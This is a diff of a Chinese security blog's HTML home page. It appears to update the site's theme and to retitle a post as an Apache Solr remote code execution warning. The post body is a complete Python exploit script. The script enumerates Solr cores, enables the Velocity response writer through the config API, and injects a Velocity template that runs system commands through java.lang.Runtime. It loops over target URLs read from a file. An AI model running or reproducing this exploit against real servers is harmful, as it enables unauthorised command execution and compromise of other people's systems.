@@ -1,120 +1,77 @@
 <!DOCTYPE html>
-
-
-
-  
-
-
-<html class="theme-next pisces use-motion" lang="zh-Hans">
+<html lang="zh-CN">
 <head>
-  <meta charset="UTF-8"/>
-<meta http-equiv="X-UA-Compatible" content="IE=edge" />
-<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
 <meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.0.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
 
 
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
 
 
-
-
-
-
-
-<meta http-equiv="Cache-Control" content="no-transform" />
-<meta http-equiv="Cache-Control" content="no-siteapp" />
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-  
-  
-  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
-
-
-
-
-
-
-
-<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
-
-<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
-
-
-
-
-
-
-
-
-
-  <meta name="keywords" content="Hexo, NexT" />
-
-
-
-
-
-  <link rel="alternate" href="/atom.xml" title="Jas502n's Blog" type="application/atom+xml" />
-
-
-
-
-
-
-<meta name="description" content="一个安全工程师的成长笔记史">
-<meta property="og:type" content="website">
-<meta property="og:title" content="Jas502n&#39;s Blog">
-<meta property="og:url" content="http:&#x2F;&#x2F;twiiter.com&#x2F;jas502n&#x2F;index.html">
-<meta property="og:site_name" content="Jas502n&#39;s Blog">
-<meta property="og:description" content="一个安全工程师的成长笔记史">
-<meta property="og:locale" content="zh-Hans">
-<meta name="twitter:card" content="summary">
-
-
-
-<script type="text/javascript" id="hexo.configurations">
+<script id="hexo-configurations">
   var NexT = window.NexT || {};
   var CONFIG = {
     root: '/',
-    scheme: 'Pisces',
-    version: '5.1.4',
-    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
-    fancybox: true,
-    tabs: true,
-    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
-    duoshuo: {
-      userId: '0',
-      author: '博主'
-    },
+    scheme: 'Gemini',
+    version: '7.4.2',
+    exturl: false,
+    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false},
+    copycode: {"enable":false,"show_result":false,"style":null},
+    back2top: {"enable":true,"sidebar":false,"scrollpercent":false},
+    bookmark: {"enable":false,"color":"#222","save":"auto"},
+    fancybox: false,
+    mediumzoom: false,
+    lazyload: false,
+    pangu: false,
     algolia: {
-      applicationID: '',
+      appID: '',
       apiKey: '',
       indexName: '',
       hits: {"per_page":10},
       labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
-    }
+    },
+    localsearch: {"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
+    path: '',
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    translation: {
+      copy_button: '复制',
+      copy_success: '复制成功',
+      copy_failure: '复制失败'
+    },
+    sidebarPadding: 40
   };
 </script>
 
+  <meta name="description" content="一个想学pwn的web狗🐶">
+<meta property="og:type" content="website">
+<meta property="og:title" content="Jas502n&#39;s Blog">
+<meta property="og:url" content="http:&#x2F;&#x2F;twiiter.com&#x2F;jas502n&#x2F;index.html">
+<meta property="og:site_name" content="Jas502n&#39;s Blog">
+<meta property="og:description" content="一个想学pwn的web狗🐶">
+<meta property="og:locale" content="zh-CN">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="http://twiiter.com/jas502n/">
 
 
-  <link rel="canonical" href="http://twiiter.com/jas502n/"/>
-
-
-
-
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome: true,
+    isPost: false,
+    isPage: false,
+    isArchive: false
+  };
+</script>
 
   <title>Jas502n's Blog</title>
   
@@ -124,235 +81,166 @@
 
 
 
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
 
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
 
 </head>
 
-<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
-
-  
-  
-    
-  
-
-  <div class="container sidebar-position-left 
-  page-home">
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
     <div class="headband"></div>
 
-    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
-      <div class="header-inner"><div class="site-brand-wrapper">
-  <div class="site-meta ">
-    
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-meta">
 
-    <div class="custom-logo-site-title">
-      <a href="/"  class="brand" rel="start">
+    <div>
+      <a href="/" class="brand" rel="start">
         <span class="logo-line-before"><i></i></span>
         <span class="site-title">Jas502n's Blog</span>
         <span class="logo-line-after"><i></i></span>
       </a>
     </div>
-      
-        <p class="site-subtitle"></p>
-      
   </div>
 
   <div class="site-nav-toggle">
-    <button>
-      <span class="btn-bar"></span>
-      <span class="btn-bar"></span>
-      <span class="btn-bar"></span>
-    </button>
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
   </div>
 </div>
 
+
 <nav class="site-nav">
   
-
-  
-    <ul id="menu" class="menu">
-      
-        
+  <ul id="menu" class="menu">
         <li class="menu-item menu-item-home">
-          <a href="/" rel="section">
-            
-              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
-            
-            首页
-          </a>
-        </li>
-      
-        
-        <li class="menu-item menu-item-about">
-          <a href="/about/" rel="section">
-            
-              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
-            
-            关于
-          </a>
-        </li>
-      
-        
-        <li class="menu-item menu-item-tags">
-          <a href="/tags/" rel="section">
-            
-              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
-            
-            标签
-          </a>
-        </li>
-      
-        
-        <li class="menu-item menu-item-categories">
-          <a href="/categories/" rel="section">
-            
-              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
-            
-            分类
-          </a>
-        </li>
-      
-        
+
+    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-search">
+
+    <a href="/search" rel="section"><i class="fa fa-fw fa-search"></i>搜索</a>
+
+  </li>
         <li class="menu-item menu-item-archives">
-          <a href="/archives/" rel="section">
-            
-              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
-            
-            归档
-          </a>
-        </li>
-      
-        
-        <li class="menu-item menu-item-schedule">
-          <a href="/schedule/" rel="section">
-            
-              <i class="menu-item-icon fa fa-fw fa-calendar"></i> <br />
-            
-            日程表
-          </a>
-        </li>
-      
-        
-        <li class="menu-item menu-item-sitemap">
-          <a href="/sitemap.xml" rel="section">
-            
-              <i class="menu-item-icon fa fa-fw fa-sitemap"></i> <br />
-            
-            站点地图
-          </a>
-        </li>
-      
-        
-        <li class="menu-item menu-item-commonweal">
-          <a href="/404/" rel="section">
-            
-              <i class="menu-item-icon fa fa-fw fa-heartbeat"></i> <br />
-            
-            公益404
-          </a>
-        </li>
-      
 
-      
-    </ul>
-  
+    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>归档</a>
 
-  
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-fw fa-th"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-fw fa-user"></i>关于</a>
+
+  </li>
+  </ul>
+
 </nav>
-
-
-
- </div>
+</div>
     </header>
 
-    <main id="main" class="main">
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
       <div class="main-inner">
         <div class="content-wrap">
-          <div id="content" class="content">
+          
+
+          <div class="content">
             
-  <section id="posts" class="posts-expand">
-    
-      
 
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  <div class="posts-expand">
+        
   
   
-  
-  <div class="post-block">
+  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="http://twiiter.com/jas502n/2019/10/30/%E6%88%91%E7%9A%84%E7%AC%AC%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Jas502n">
-      <meta itemprop="description" content="">
       <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Jas502n">
+      <meta itemprop="description" content="一个想学pwn的web狗🐶">
     </span>
 
     <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
       <meta itemprop="name" content="Jas502n's Blog">
     </span>
-
-    
       <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2019/10/30/%E6%88%91%E7%9A%84%E7%AC%AC%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0/" itemprop="url">我的第一篇文章</a></h1>
-        
+        <h1 class="post-title" itemprop="name headline">
+          
+            <a href="/2019/10/30/%E6%88%91%E7%9A%84%E7%AC%AC%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0/" class="post-title-link" itemprop="url">Apache Solr 远程代码命令执行漏洞预警</a>
+        </h1>
 
         <div class="post-meta">
-          <span class="post-time">
-            
+            <span class="post-meta-item">
               <span class="post-meta-item-icon">
                 <i class="fa fa-calendar-o"></i>
               </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-10-30T22:58:10+08:00">
-                2019-10-30
-              </time>
-            
+              <span class="post-meta-item-text">发表于</span>
 
-            
-
-            
-          </span>
-
-          
-
-          
-            
-              <span class="post-comments-count">
-                <span class="post-meta-divider">|</span>
+              <time title="创建时间：2019-10-30 22:58:10" itemprop="dateCreated datePublished" datetime="2019-10-30T22:58:10+08:00">2019-10-30</time>
+            </span>
+              <span class="post-meta-item">
                 <span class="post-meta-item-icon">
-                  <i class="fa fa-comment-o"></i>
+                  <i class="fa fa-calendar-check-o"></i>
                 </span>
-                <a href="/2019/10/30/%E6%88%91%E7%9A%84%E7%AC%AC%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0/#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count ds-thread-count" data-thread-key="2019/10/30/我的第一篇文章/" itemprop="commentCount"></span>
-                </a>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2019-11-01 02:53:23" itemprop="dateModified" datetime="2019-11-01T02:53:23+08:00">2019-11-01</time>
               </span>
-            
-          
-
-          
-          
-
-          
-
-          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/" itemprop="url" rel="index">
+                    <span itemprop="name">模板注入</span>
+                  </a>
+                </span>
+            </span>
 
           
 
         </div>
       </header>
-    
 
     
     
@@ -360,129 +248,57 @@
     <div class="post-body" itemprop="articleBody">
 
       
-      
+          <h1 id="python-高亮代码效果"><a href="#python-高亮代码效果" class="headerlink" title="python 高亮代码效果"></a>python 高亮代码效果</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests,</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_code_name</span><span class="params">(url)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> url[<span class="number">-1</span>] == <span class="string">'/'</span>:</span><br><span class="line">        url = url[:<span class="number">-1</span>]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        url = url</span><br><span class="line">        </span><br><span class="line">    core_url = url + <span class="string">'/solr/admin/cores?_=1572502179076&amp;indexInfo=false&amp;wt=json'</span></span><br><span class="line">    <span class="keyword">print</span> core_url</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        r = requests.get(core_url)</span><br><span class="line">        <span class="keyword">if</span> r.status_code == <span class="number">200</span> <span class="keyword">and</span> <span class="string">'responseHeader'</span> <span class="keyword">in</span> r.content <span class="keyword">and</span> <span class="string">'status'</span> <span class="keyword">in</span> r.content:</span><br><span class="line">            json_str = json.loads(r.content)</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> json_str[<span class="string">'status'</span>]:</span><br><span class="line">                core_name_url = url + <span class="string">'/solr/'</span> + i + <span class="string">'/config'</span></span><br><span class="line">                <span class="keyword">print</span> core_name_url</span><br><span class="line">                update_queryresponsewriter(core_name_url)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">"No core name exit!"</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">update_queryresponsewriter</span><span class="params">(core_name_url)</span>:</span></span><br><span class="line">    headers = &#123;</span><br><span class="line">    <span class="string">'User-Agent'</span>: <span class="string">'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0'</span>,</span><br><span class="line">    <span class="string">'Accept'</span>: <span class="string">'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'</span>,</span><br><span class="line">    <span class="string">'Accept-Language'</span>: <span class="string">'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3'</span>,</span><br><span class="line">    <span class="string">'Accept-Encoding'</span>: <span class="string">'gzip, deflate'</span>,</span><br><span class="line">    <span class="string">'Content-Type'</span>: <span class="string">'application/json'</span>,</span><br><span class="line">    <span class="string">'Content-Length'</span>: <span class="string">'259'</span>,</span><br><span class="line">    <span class="string">'Connection'</span>: <span class="string">'close'</span></span><br><span class="line">    &#125;</span><br><span class="line">    payload = <span class="string">'''</span></span><br><span class="line"><span class="string">    &#123;</span></span><br><span class="line"><span class="string">      "update-queryresponsewriter": &#123;</span></span><br><span class="line"><span class="string">        "startup": "lazy",</span></span><br><span class="line"><span class="string">        "name": "velocity",</span></span><br><span class="line"><span class="string">        "class": "solr.VelocityResponseWriter",</span></span><br><span class="line"><span class="string">        "template.base.dir": "",</span></span><br><span class="line"><span class="string">        "solr.resource.loader.enabled": "true",</span></span><br><span class="line"><span class="string">        "params.resource.loader.enabled": "true"</span></span><br><span class="line"><span class="string">      &#125;</span></span><br><span class="line"><span class="string">    &#125;'''</span></span><br><span class="line">    proxies = &#123;<span class="string">"http"</span>:<span class="string">"http://127.0.0.1:8080"</span>&#125;</span><br><span class="line">    r = requests.post(core_name_url,headers=headers,data=payload)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> r.status_code == <span class="number">200</span> <span class="keyword">and</span> <span class="string">'responseHeader'</span> <span class="keyword">in</span> r.content:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"maybe enable Successful!\n"</span></span><br><span class="line">        exp_url = core_name_url[:<span class="number">-7</span>]</span><br><span class="line">        <span class="keyword">print</span> exp_url</span><br><span class="line">        cmd = <span class="string">'whoami'</span></span><br><span class="line">        <span class="comment"># cmd = sys.argv[2]</span></span><br><span class="line"></span><br><span class="line">        send_exp(exp_url,cmd)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"enable Fail!\n"</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send_exp</span><span class="params">(exp_url,cmd)</span>:</span></span><br><span class="line">    exp_url = exp_url + <span class="string">r"/select?q=1&amp;&amp;wt=velocity&amp;v.template=custom&amp;v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27"</span> + cmd + <span class="string">r"%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end"</span></span><br><span class="line">    </span><br><span class="line">    r = requests.get(exp_url)</span><br><span class="line">    <span class="keyword">if</span> r.status_code == <span class="number">400</span> <span class="keyword">or</span> r.status_code == <span class="number">500</span> <span class="keyword">and</span> len(r.content) &gt;<span class="number">0</span>:</span><br><span class="line">        <span class="keyword">print</span> exp_url,<span class="string">'\n'</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">'&gt;&gt;&gt;&gt;&gt;&gt;&gt;\n'</span>,r.content</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"exp No Send Successful!\n"</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    print(<span class="string">"\n[+] python %s http://x.x.x.x:8983  command\n"</span> % sys.argv[<span class="number">0</span>])</span><br><span class="line">    <span class="comment"># url = "http://192.168.5.86:8983"</span></span><br><span class="line">    <span class="comment"># url = sys.argv[1]</span></span><br><span class="line">    f = open(<span class="string">'url.txt'</span>,<span class="string">'rb'</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> f.readlines():</span><br><span class="line">        url = i.split(<span class="string">'\r\n'</span>)[<span class="number">0</span>]</span><br><span class="line">        get_code_name(url)</span><br></pre></td></tr></table></figure>
 
-      
-        
-          
-            <h1 id="python-高亮代码效果"><a href="#python-高亮代码效果" class="headerlink" title="python 高亮代码效果"></a>python 高亮代码效果</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests,</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_code_name</span><span class="params">(url)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> url[<span class="number">-1</span>] == <span class="string">'/'</span>:</span><br><span class="line">        url = url[:<span class="number">-1</span>]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        url = url</span><br><span class="line">        </span><br><span class="line">    core_url = url + <span class="string">'/solr/admin/cores?_=1572502179076&amp;indexInfo=false&amp;wt=json'</span></span><br><span class="line">    <span class="keyword">print</span> core_url</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        r = requests.get(core_url)</span><br><span class="line">        <span class="keyword">if</span> r.status_code == <span class="number">200</span> <span class="keyword">and</span> <span class="string">'responseHeader'</span> <span class="keyword">in</span> r.content <span class="keyword">and</span> <span class="string">'status'</span> <span class="keyword">in</span> r.content:</span><br><span class="line">            json_str = json.loads(r.content)</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> json_str[<span class="string">'status'</span>]:</span><br><span class="line">                core_name_url = url + <span class="string">'/solr/'</span> + i + <span class="string">'/config'</span></span><br><span class="line">                <span class="keyword">print</span> core_name_url</span><br><span class="line">                update_queryresponsewriter(core_name_url)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">"No core name exit!"</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">update_queryresponsewriter</span><span class="params">(core_name_url)</span>:</span></span><br><span class="line">    headers = &#123;</span><br><span class="line">    <span class="string">'User-Agent'</span>: <span class="string">'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0'</span>,</span><br><span class="line">    <span class="string">'Accept'</span>: <span class="string">'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'</span>,</span><br><span class="line">    <span class="string">'Accept-Language'</span>: <span class="string">'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3'</span>,</span><br><span class="line">    <span class="string">'Accept-Encoding'</span>: <span class="string">'gzip, deflate'</span>,</span><br><span class="line">    <span class="string">'Content-Type'</span>: <span class="string">'application/json'</span>,</span><br><span class="line">    <span class="string">'Content-Length'</span>: <span class="string">'259'</span>,</span><br><span class="line">    <span class="string">'Connection'</span>: <span class="string">'close'</span></span><br><span class="line">    &#125;</span><br><span class="line">    payload = <span class="string">'''</span></span><br><span class="line"><span class="string">    &#123;</span></span><br><span class="line"><span class="string">      "update-queryresponsewriter": &#123;</span></span><br><span class="line"><span class="string">        "startup": "lazy",</span></span><br><span class="line"><span class="string">        "name": "velocity",</span></span><br><span class="line"><span class="string">        "class": "solr.VelocityResponseWriter",</span></span><br><span class="line"><span class="string">        "template.base.dir": "",</span></span><br><span class="line"><span class="string">        "solr.resource.loader.enabled": "true",</span></span><br><span class="line"><span class="string">        "params.resource.loader.enabled": "true"</span></span><br><span class="line"><span class="string">      &#125;</span></span><br><span class="line"><span class="string">    &#125;'''</span></span><br><span class="line">    proxies = &#123;<span class="string">"http"</span>:<span class="string">"http://127.0.0.1:8080"</span>&#125;</span><br><span class="line">    r = requests.post(core_name_url,headers=headers,data=payload)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> r.status_code == <span class="number">200</span> <span class="keyword">and</span> <span class="string">'responseHeader'</span> <span class="keyword">in</span> r.content:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"maybe enable Successful!\n"</span></span><br><span class="line">        exp_url = core_name_url[:<span class="number">-7</span>]</span><br><span class="line">        <span class="keyword">print</span> exp_url</span><br><span class="line">        cmd = <span class="string">'whoami'</span></span><br><span class="line">        <span class="comment"># cmd = sys.argv[2]</span></span><br><span class="line"></span><br><span class="line">        send_exp(exp_url,cmd)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"enable Fail!\n"</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send_exp</span><span class="params">(exp_url,cmd)</span>:</span></span><br><span class="line">    exp_url = exp_url + <span class="string">r"/select?q=1&amp;&amp;wt=velocity&amp;v.template=custom&amp;v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27"</span> + cmd + <span class="string">r"%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end"</span></span><br><span class="line">    </span><br><span class="line">    r = requests.get(exp_url)</span><br><span class="line">    <span class="keyword">if</span> r.status_code == <span class="number">400</span> <span class="keyword">or</span> r.status_code == <span class="number">500</span> <span class="keyword">and</span> len(r.content) &gt;<span class="number">0</span>:</span><br><span class="line">        <span class="keyword">print</span> exp_url,<span class="string">'\n'</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">'&gt;&gt;&gt;&gt;&gt;&gt;&gt;\n'</span>,r.content</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"exp No Send Successful!\n"</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    print(<span class="string">"\n[+] python %s http://x.x.x.x:8983  command\n"</span> % sys.argv[<span class="number">0</span>])</span><br><span class="line">    <span class="comment"># url = "http://192.168.5.86:8983"</span></span><br><span class="line">    <span class="comment"># url = sys.argv[1]</span></span><br><span class="line">    f = open(<span class="string">'url.txt'</span>,<span class="string">'rb'</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> f.readlines():</span><br><span class="line">        url = i.split(<span class="string">'\r\n'</span>)[<span class="number">0</span>]</span><br><span class="line">        get_code_name(url)</span><br></pre></td></tr></table></figure>
-
-          
-        
       
     </div>
-    
-    
-    
 
     
-
     
-
     
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
+      <footer class="post-footer">
         <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
+      </footer>
   </article>
-
-
-    
-      
-
-  
-
   
   
   
 
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+        
   
   
-  
-  <div class="post-block">
+  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="http://twiiter.com/jas502n/2019/10/30/hello-world/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Jas502n">
-      <meta itemprop="description" content="">
       <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Jas502n">
+      <meta itemprop="description" content="一个想学pwn的web狗🐶">
     </span>
 
     <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
       <meta itemprop="name" content="Jas502n's Blog">
     </span>
-
-    
